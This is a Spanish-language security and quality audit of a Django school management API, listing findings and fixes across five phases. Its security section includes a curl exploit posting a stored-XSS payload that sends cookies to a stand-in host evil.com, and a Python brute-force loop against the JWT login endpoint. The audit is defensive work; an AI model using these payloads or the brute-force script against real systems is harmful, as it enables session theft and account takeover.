# 🔍 Auditoría Exhaustiva - Framework de 5 Fases

> **Schoolar OS API - Informe de Seguridad y Calidad**  
> Generado: 2024-12-18 | Metodología: Prompts Enfocados Secuenciales

---

# FASE 1: AUDITORÍA DE SEGURIDAD (CRÍTICA)

## 1.1 Inyección de Código (SQL, NoSQL, Command)

### ✅ Buenas Prácticas Detectadas
- Django ORM usado correctamente en la mayoría de consultas
- No se detecta concatenación directa de SQL
- `get_object_or_404()` usado para búsquedas seguras

### ⚠️ Vectores de Riesgo Bajo

**Archivo:** [academico/views.py:753](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/academico/views.py#L753)

```python
curso = Curso.objects.filter(nombre__iexact=curso_nombre).first()
```

**Análisis:** `iexact` con input de usuario puede causar problemas de performance (no inyección), pero el input viene de CSV parseado, no de request directo. **Riesgo: BAJO**.

### 🔴 Potencial Command Injection

**Archivo:** [academico/views.py:698](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/academico/views.py#L698)

```python
decoded_file = archivo.read().decode('utf-8-sig').splitlines()
```

**Vector:** Si un atacante sube un archivo malformado con encoding especial, podría causar `UnicodeDecodeError` y potencialmente exponer paths del sistema en el traceback.

**Recomendación:**
```python
try:
    decoded_file = archivo.read().decode('utf-8-sig').splitlines()
except UnicodeDecodeError:
    messages.error(request, "El archivo tiene un formato de texto inválido.")
    return render(...)
```

---

## 1.2 Validación y Saneamiento de Inputs

### 🔴 CRÍTICO: Inputs No Validados en Vistas Web

**Archivo:** [tareas/views.py:78-99](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/tareas/views.py#L78-L99)

```python
if request.method == 'POST':
    titulo = request.POST.get('titulo')           # ❌ Sin validación de longitud
    descripcion = request.POST.get('descripcion') # ❌ Sin sanitización HTML
    tipo = request.POST.get('tipo')               # ❌ Sin validación contra CHOICES
    curso_id = request.POST.get('curso')          # ❌ Sin validación de tipo (podría ser NaN, negativo)
    # ...
    tarea = Tarea.objects.create(
        titulo=titulo,  # Se guarda directo
```

**Impacto:**
1. **XSS Almacenado:** Si `descripcion` contiene `<script>alert('xss')</script>`, se guardará en BD y renderizará en templates
2. **Datos Inválidos:** `tipo` podría ser cualquier string, no solo los permitidos
3. **Errores 500:** `puntaje_maximo` podría ser "abc" y causar IntegrityError

**Explotación:**
```bash
curl -X POST /tareas/crear/ \
  -d "titulo=<img src=x onerror=alert(1)>" \
  -d "descripcion=<script>document.location='http://evil.com?c='+document.cookie</script>" \
  -d "tipo=VALOR_INVALIDO" \
  -d "puntaje_maximo=-999"
```

**Recomendación:**
```python
from django import forms

class TareaForm(forms.ModelForm):
    class Meta:
        model = Tarea
        fields = ['titulo', 'descripcion', 'tipo', 'curso', 'asignatura', ...]
    
    def clean_puntaje_maximo(self):
        valor = self.cleaned_data['puntaje_maximo']
        if valor < 0 or valor > 1000:
            raise forms.ValidationError("Puntaje debe estar entre 0 y 1000")
        return valor
```

---

### 🔴 CRÍTICO: Inputs No Validados en API REST

**Archivo:** [api/views.py:139-148](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/api/views.py#L139-L148)

Los endpoints de la API reciben datos pero **nunca validan con un Serializer de escritura**:

```python
class AlumnoNotasView(ListAPIView):
    def get_queryset(self):
        user = self.request.user  # ✓ Valida autenticación
        return Calificacion.objects.filter(
            estudiante=user  # ✓ Filtra por usuario
        )  # Pero no hay validación de query params
```

**Query params como `?page=-1` o `?page=abc`** podrían causar errores no manejados.

---

### 🟠 ALTO: Type Coercion Peligroso

**Archivo:** [tareas/views.py:145-149](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/tareas/views.py#L145-L149)

```python
puntaje = request.POST.get('puntaje')  # String del form
# ...
entrega.puntaje = puntaje  # Se asigna directo sin cast
entrega.save()
```

**Impacto:** Si `puntaje = "abc"`, Django intentará guardarlo y fallará con `DataError`.

---

## 1.3 Gestión de Secretos y Sesión

### 🔴 CRÍTICO: Rate Limiting Ausente en API JWT

**Archivo:** [api/views.py:49-64](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/api/views.py#L49-L64)

```python
class CustomTokenObtainPairView(TokenObtainPairView):
    serializer_class = CustomTokenObtainPairSerializer
    
    def post(self, request, *args, **kwargs):
        response = super().post(request, *args, **kwargs)
        # ❌ SIN RATE LIMITING - Ataques de fuerza bruta ilimitados
```

**Contraste con login web:** [usuarios/views.py:126-177](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/usuarios/views.py#L126-L177) SÍ implementa protección.

**Explotación:**
```python
import requests
for password in wordlist:
    r = requests.post('https://target.com/api/auth/login/', 
                      json={'username': 'admin', 'password': password})
    if r.status_code == 200:
        print(f"Cracked: {password}")
```

---

### 🔴 CRÍTICO: JWT Blacklist No Funcional

**Archivo:** [settings.py:402-413](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/config/settings.py#L402-L413)

```python
SIMPLE_JWT = {
    'BLACKLIST_AFTER_ROTATION': True,  # ⚠️ REQUIERE APP INSTALADA
}

INSTALLED_APPS = [
    # ...
    'rest_framework_simplejwt',  # ✓ Base instalada
    # 'rest_framework_simplejwt.token_blacklist',  # ❌ FALTA
]
```

**Impacto:** Tokens revocados siguen siendo válidos. Si roban un refresh token, el atacante tiene acceso por 7 días.

---

### 🟠 ALTO: Exposición de ID Interno

**Archivo:** [serializers.py:35-38](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/api/serializers.py#L35-L38)

```python
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['id', 'username', ...]  # ❌ id autoincremental expuesto
```

**Impacto:** Viola política de "nunca exponer IDs enteros" documentada. Permite enumeration attacks.

---

### 🟡 MEDIO: Generación de Códigos Predecibles

**Archivo:** [core/models.py:104-110](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/core/models.py#L104-L110)

```python
@staticmethod
def _generate_code():
    import random  # ❌ NO criptográficamente seguro
    chars = string.ascii_uppercase + string.digits
    return 'COLE-' + ''.join(random.choices(chars, k=4))
```

---

## 1.4 Cabeceras y Configuración Segura

### ✅ Implementado Correctamente

| Header | Estado | Archivo |
|--------|--------|---------|
| HSTS | ✓ 1 año | settings.py:224 |
| X-Frame-Options | ✓ DENY | settings.py:218 |
| X-Content-Type-Options | ✓ nosniff | settings.py:216 |
| CSRF | ✓ Cookies seguras en prod | settings.py:222 |

### 🟠 ALTO: CSP Permite `'unsafe-inline'`

**Archivo:** [settings.py:235-239](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/config/settings.py#L235-L239)

```python
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'", ...)  # ❌
CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'", ...)  # ❌
```

**Impacto:** CSP no protege contra XSS si permite inline scripts.

---

### 🔴 CRÍTICO: CORS Totalmente Abierto en DEBUG

**Archivo:** [settings.py:424-425](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/config/settings.py#L424-L425)

```python
if DEBUG:
    CORS_ALLOW_ALL_ORIGINS = True  # ❌ CUALQUIER origen
```

**Escenario de Ataque:** Si DEBUG=True escapa a producción:
1. Atacante crea `evil.com`
2. Víctima autenticada visita `evil.com`
3. JavaScript en `evil.com` hace fetch a `/api/alumno/me/notas/`
4. CORS permite la request, datos del alumno robados

---

# FASE 2: RENDIMIENTO Y CONCURRENCIA

## 2.1 Condiciones de Carrera

### 🔴 CRÍTICO: Race Condition en Update de Entregas

**Archivo:** [tareas/views.py:240-255](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/tareas/views.py#L240-L255)

```python
if entrega_existente:
    entrega_existente.archivo = archivo  # ❌ Read-Modify-Write sin lock
    entrega_existente.comentario_estudiante = comentario
    entrega_existente.estado = 'pendiente'
    entrega_existente.save()
```

**Escenario:**
1. Estudiante envía entrega desde laptop
2. Simultáneamente envía desde celular
3. Ambas leen el mismo `entrega_existente`
4. La segunda sobrescribe la primera

**Solución:**
```python
from django.db import transaction
from django.db.models import F

with transaction.atomic():
    entrega = Entrega.objects.select_for_update().get(id=entrega_id)
    entrega.archivo = archivo
    entrega.save()
```

---

### 🟠 ALTO: Singleton Sin Lock

**Archivo:** [core/models.py:34-37](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/core/models.py#L34-L37)

```python
def save(self, *args, **kwargs):
    self.pk = 1  # ❌ No atómico
    super().save(*args, **kwargs)
```

Dos requests concurrentes a `ColegioConfig.get_config()` podrían causar `IntegrityError`.

---

## 2.2 Problemas de Base de Datos (N+1)

### 🔴 CRÍTICO: N+1 Masivo en ApoderadoPupilosView

**Archivo:** [api/views.py:441-472](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/api/views.py#L441-L472)

```python
for pupilo in pupilos:  # Ya tiene select_related
    # QUERY 1-2 por pupilo: Inscripción
    inscripcion = InscripcionCurso.objects.filter(...).first()
    
    # QUERY 3 por pupilo: Promedio
    promedio = Calificacion.objects.filter(...).aggregate(...)
    
    # QUERY 4-5 por pupilo: Asistencia
    total_dias = Asistencia.objects.filter(...).count()
    dias_presente = Asistencia.objects.filter(...).count()
```

**Impacto:** 5 pupilos = 1 + (5 × 5) = **26 queries**

---

### 🟠 ALTO: N+1 en Dashboard Profesor

**Archivo:** [academico/views.py:226-230](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/academico/views.py#L226-L230)

```python
for curso in cursos_unicos:
    promedio_eval = Calificacion.objects.filter(
        curso=curso, 
        asignatura=ultima_eval.asignatura,
        ...
    ).aggregate(Avg('nota'))  # ❌ Query por cada curso
```

---

### 🟠 ALTO: Loop con Queries en detalle_estudiante

**Archivo:** [academico/views.py:647-674](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/academico/views.py#L647-L674)

```python
for inscripcion in inscripciones:
    promedio = Calificacion.objects.filter(...).aggregate(...)  # Query
    total_asist = Asistencia.objects.filter(...).count()  # Query
    presentes = Asistencia.objects.filter(...).count()  # Query
```

---

## 2.3 Sin Aplicación Frontend React/Vue

No aplica - El frontend usa Django Templates + HTMX.

---

## 2.4 Fugas de Memoria y Recursos

### ✅ No Detectadas

El código es server-side con request-response cycle. No hay:
- WebSockets sin cleanup
- Background tasks sin límite
- Conexiones persistentes sin pool

---

# FASE 3: ARQUITECTURA Y DISEÑO

## 3.1 Principios SOLID

### 🔴 Violación SRP: Vistas Monolíticas

**Archivo:** [academico/views.py](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/academico/views.py) — 1086 líneas

Una sola vista `dashboard_academico` decide qué dashboard renderizar basándose en tipo de usuario. Debería ser 3 vistas separadas.

---

### 🟠 Violación OCP: Condicionales Hardcodeados

```python
# Se repite en 15+ lugares:
if user.perfil.tipo_usuario in ['profesor', 'administrativo', 'directivo']:
```

**Problema:** Para agregar un nuevo rol, hay que modificar código en 15 archivos.

**Solución:** Usar decoradores o mixins:
```python
@role_required('profesor', 'administrativo', 'directivo')
def mi_vista(request):
    ...
```

---

### 🟠 Violación DIP: Acoplamiento a Modelos Concretos

**Archivo:** [api/views.py:347-360](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/api/views.py#L347-L360)

```python
def get_queryset(self):
    from tareas.models import Tarea  # ❌ Import concreto dentro de método
    from academico.models import InscripcionCurso
```

Los imports deberían estar al inicio del archivo.

---

## 3.2 Acoplamiento y Cohesión

### 🟠 Alto Acoplamiento

```
api/views.py → academico/models.py
api/views.py → tareas/models.py  
api/views.py → usuarios/models.py
api/views.py → core/models.py
```

La app `api` conoce directamente 4 apps. Debería usar **servicios intermediarios**.

---

## 3.3 Diseño de API

### ✅ Buenas Prácticas

| Aspecto | Estado |
|---------|--------|
| Verbos HTTP correctos | ✓ GET para lectura, POST para acciones |
| Sustantivos en endpoints | ✓ `/api/alumno/me/notas/` |
| Respuesta consistente | ✓ `{success, data, message, errors}` |
| Códigos de estado | ✓ 200, 403, 404 usados correctamente |

### 🟡 Mejoras Sugeridas

| Issue | Recomendación |
|-------|---------------|
| Sin versionado | Usar `/api/v1/...` |
| Sin paginación uniforme | Algunos limitan a 50, otros usan PAGE_SIZE=20 |
| Sin rate limiting público | Agregar throttle a `/api/colegio/discover/` |

---

# FASE 4: CALIDAD Y MANTENIBILIDAD

## 4.1 Legibilidad y Complejidad

### 🟠 Funciones de Alta Complejidad

| Función | Líneas | Complejidad |
|---------|--------|-------------|
| `dashboard_profesor` | 70 | Alta (8 branches) |
| `registrar_notas_curso` | 100 | Alta (10 branches) |
| `importar_estudiantes` | 90 | Alta (12 branches) |

**Recomendación:** Extraer lógica a servicios.

---

### 🟡 Números Mágicos

```python
[:50]  # ¿Por qué 50 notificaciones?
[:10]  # ¿Por qué 10 calificaciones recientes?
timedelta(days=30)  # ¿Por qué 30 días?
```

**Solución:**
```python
MAX_NOTIFICACIONES = 50
CALIFICACIONES_RECIENTES_LIMIT = 10
```

---

## 4.2 Manejo de Errores

### 🔴 Catch Genérico Expone Información

**Archivo:** [usuarios/views.py:106-107](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/usuarios/views.py#L106-L107)

```python
except Exception as e:
    messages.error(request, f'Error al registrar usuario: {str(e)}')
```

**Riesgo:** Expone stack traces y estructura de BD.

---

### 🟠 Excepciones Silenciadas

**Archivo:** [academico/views.py:317-318](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/academico/views.py#L317-L318)

```python
except Exception:
    pass  # ❌ Error completamente ignorado
```

---

## 4.3 Type Safety y Testing

### 🔴 Sin Tests

```
apps/api/tests.py: 63 bytes (vacío)
apps/usuarios/tests.py: 63 bytes (vacío)
```

**Ningún endpoint tiene tests automatizados.**

---

# FASE 5: LÓGICA DE NEGOCIO Y UX

## 5.1 Casos Límite (Edge Cases)

### 🔴 5 Edge Cases No Manejados

| # | Caso | Archivo | Impacto |
|---|------|---------|---------|
| 1 | Estudiante sin perfil | api/views.py:97 | `AttributeError` |
| 2 | Puntaje = 0 | tareas/views.py:149 | ¿Es válido? |
| 3 | Fecha futura en notas | academico/views.py:567 | Se acepta |
| 4 | Nota negativa | POST manual | `IntegrityError` |
| 5 | Array vacío de pupilos | api/views.py:437 | 404? 200 vacío? |

---

### 🟠 Zonas Horarias No Manejadas

```python
fecha_hoy = datetime.now().date()  # ❌ Hora local del servidor
```

**Debería ser:**
```python
from django.utils import timezone
fecha_hoy = timezone.localdate()
```

---

## 5.2 Idempotencia

### 🔴 Operaciones No Idempotentes

**Archivo:** [tareas/views.py:249-254](file:///c:/Users/cris/Proyecto%20integrado%20corregido/Proyecto%20Integrado%20pagina%20web/apps/tareas/views.py#L249-L254)

```python
Entrega.objects.create(
    tarea=tarea,
    estudiante=request.user,
    archivo=archivo,
)
```

**Problema:** Si el usuario hace doble-click en "Enviar", se crean 2 entregas.

**Solución:**
```python
Entrega.objects.get_or_create(
    tarea=tarea,
    estudiante=request.user,
    defaults={'archivo': archivo}
)
```

---

## 5.3 Accesibilidad

No evaluable directamente desde código backend. Requiere revisar templates HTML.

---

# 📊 RESUMEN EJECUTIVO

| Fase | Críticos | Altos | Medios | Bajos |
|------|----------|-------|--------|-------|
| 1. Seguridad | 5 | 3 | 2 | 0 |
| 2. Rendimiento | 1 | 3 | 0 | 0 |
| 3. Arquitectura | 0 | 3 | 2 | 0 |
| 4. Calidad | 1 | 2 | 1 | 1 |
| 5. Lógica | 1 | 2 | 1 | 0 |
| **TOTAL** | **8** | **13** | **6** | **1** |

---

# 🎯 TOP 5 PRIORIDADES INMEDIATAS

| # | Issue | Remediación | Esfuerzo |
|---|-------|-------------|----------|
| 1 | Rate limiting JWT | Agregar throttle class | 1h |
| 2 | Blacklist JWT | Agregar app a INSTALLED_APPS | 15min |
| 3 | Validación inputs tareas | Crear TareaForm | 2h |
| 4 | N+1 en ApoderadoPupilos | Prefetch + annotate | 3h |
| 5 | CORS en DEBUG | Remover CORS_ALLOW_ALL | 15min |

---

> ⚠️ **VEREDICTO FINAL:** Sistema **NO APTO para producción** hasta resolver issues de Fase 1 (Seguridad).
